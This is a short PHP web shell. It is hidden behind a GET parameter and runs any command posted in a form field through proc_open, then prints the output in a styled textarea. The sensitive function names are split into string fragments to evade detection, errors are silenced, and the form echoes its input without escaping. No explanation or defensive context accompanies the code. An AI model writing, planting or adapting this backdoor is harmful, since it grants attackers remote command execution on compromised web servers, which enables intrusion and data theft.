<?php 
if (isset($_GET['proses'])) {
	error_reporting(0);
function e($c) {
	$hsc = "htm"."lspe"."cia"."lch"."ars";
	$sgc = 'str'.'eam_g'.'et_con'.'ten'.'ts';
	$fe = 'fun'.'ct'.'io'.'n_'.'e'.'xi'.'sts';
	$pm = 'pre'.'g_'.'ma'.'tch';
    $ler = "2".">"."&"."1";
    if (!$pm("/".$ler."/i", $coman)) {
        $coman = $coman." ".$ler;
    }
    $komen = $c;
    $pr = "p"."r"."o"."c_o"."p"."en";
    if ($fe($pr)) {
    $tod = @$pr($komen, array(0 => array("p"."i"."p"."e", "r"), 1 => array("p"."i"."p"."e", "w"), 2 => array("pipe", "r")), $crottz);
    echo "<pre><textarea rows='25' style='color:lime;background-color:#000;' readonly='' cols='120px'>
    ".$hsc($sgc($crottz[1]))."</textarea></pre><br>";
    } else {
        echo "<font color='orange'>po!</font>";
   		}
	}
	echo '<br><form method="post"><center>
    <div class="input-group" style="width:600px;">
     <input type="text" class="form-control" name="kom" id="c" value="'.$_POST['kom'].'" placeholder="****" required>
    <button type="submit" name="pro" value="ex" class="btn btn-outline-light mb-1">>></button></div></form><br><center>';
    if (isset($_POST['pro'])) {
        e($_POST['kom']);
    }
}
